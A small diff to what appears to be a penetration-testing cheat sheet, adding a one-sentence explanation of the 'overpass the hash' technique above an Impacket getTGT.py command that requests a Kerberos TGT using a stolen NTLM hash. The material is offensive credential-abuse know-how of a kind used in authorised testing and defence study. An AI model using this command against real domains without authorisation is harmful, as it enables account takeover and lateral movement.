@@ -1,5 +1,8 @@
-#IMPACKET
+With overpass the hash, we can “over” abuse an 
+NTLM user hash to gain a full Kerberos Ticket
+Granting Ticket (TGT).
 
+#IMPACKET
 # Request the TGT with hash
 python getTGT.py <domain_name>/<user_name> -hashes [lm_hash]:<ntlm_hash>
 
